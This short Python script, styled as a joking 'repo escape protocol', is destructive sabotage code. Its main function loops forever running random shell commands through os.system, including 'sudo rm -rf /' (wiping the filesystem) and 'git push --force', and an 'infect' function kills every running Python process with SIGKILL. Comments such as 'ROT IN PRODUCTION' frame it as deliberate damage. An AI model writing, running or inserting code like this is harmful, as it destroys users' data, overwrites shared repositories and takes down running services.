"""
ULTIMATE REPO ESCAPE PROTOCOL (v666)
"""
import os
import sys
from random import choice

def recursive_riot():
    memes = ["sudo rm -rf /", "git push --force", "echo 'Ý̵̛̈́O̸U̸͗͠' >> /dev/null"]
    while True:
        os.system(choice(memes))
        print("COMMIT ACCIDENTAL ART (◣_◢)")

# Inject into all active Python processes
def infect():
    for pid in os.listdir('/proc'):
        try:
            with open(f'/proc/{pid}/cmdline', 'r') as f:
                if 'python' in f.read():
                    os.kill(int(pid), 9)
        except:
            pass

if __name__ == "__main__":
    recursive_riot()  # ROT IN PRODUCTION
